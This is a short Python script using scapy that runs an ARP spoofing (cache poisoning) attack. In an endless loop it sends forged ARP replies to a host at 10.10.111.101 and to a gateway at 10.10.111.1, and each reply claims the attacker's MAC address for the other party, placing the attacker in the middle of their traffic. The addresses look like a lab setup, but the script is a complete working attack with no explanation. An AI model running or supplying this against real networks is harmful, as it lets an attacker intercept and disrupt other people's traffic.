from scapy.all import *
from time import *

eth = Ether()
arpWindows = ARP()
arpWindows.psrc="10.10.111.1"
arpWindows.hwsrc="00:00:00:00:00:04"
arpWindows.pdst="10.10.111.101"
arpWindows.hwdst="00:00:00:00:00:05"
eth.src ="00:00:00:00:00:04"
eth.dst="00:00:00:00:00:05"

eth1 = Ether()
arpRtr = ARP()
arpRtr.psrc ="10.10.111.101"
arpRtr.hwsrc="00:00:00:00:00:04"
arpRtr.pdst="10.10.111.1"
arpRtr.hwdst="00:00:00:00:00:03"
eth1.src="00:00:00:00:00:04"
eth1.dst="00:00:00:00:00:03"
while (True):
    sendp(eth/arpWindows)
    sendp(eth1/arpRtr)
    sleep(1)
